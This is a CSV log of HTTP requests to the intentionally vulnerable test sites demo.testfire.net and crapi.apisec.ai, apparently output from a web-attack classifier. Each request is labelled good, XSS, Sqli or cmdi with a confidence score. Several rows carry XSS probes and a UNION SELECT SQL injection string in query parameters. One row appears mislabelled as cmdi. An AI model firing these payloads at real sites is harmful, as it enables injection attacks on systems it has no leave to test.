GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/css/main.fca8df6d.chunk.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/js/main.fd3f1560.chunk.js,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/css/2.a2026422.chunk.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/js/2.e7093047.chunk.js,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/106.206.77.3,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/login,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/css/2.a2026422.chunk.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/css/main.fca8df6d.chunk.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/js/2.e7093047.chunk.js,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/js/main.fd3f1560.chunk.js,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/login,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/css/2.a2026422.chunk.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/css/main.fca8df6d.chunk.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/js/2.e7093047.chunk.js,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/js/main.fd3f1560.chunk.js,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.246,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.246,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.246,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</scriptz>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.246,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</scriptz>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.246,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</scriptz>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.246,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</scriptz>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.246,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(10</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.246,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.246,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=<title+onPropertyChange+title+onPropertyChange=""javascript:javascript:alert(1)""></title+onPropertyChange>",,0,2,0,1,0,4,0,0,0,1,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/css/2.a2026422.chunk.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/css/main.fca8df6d.chunk.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/js/main.fd3f1560.chunk.js,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/js/2.e7093047.chunk.js,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/<script>alert(10</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://crapi.apisec.ai/<a href=""javas/x0Bcript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,0,4,0,1,2,4,0,0,0,0,2,1,6,cmdi,0.9896
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=hello,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1+UNION+SELECT+1+INTO+@,@",,0,0,0,0,0,0,0,0,2,0,0,0,0,good,0.9991
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=hello,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
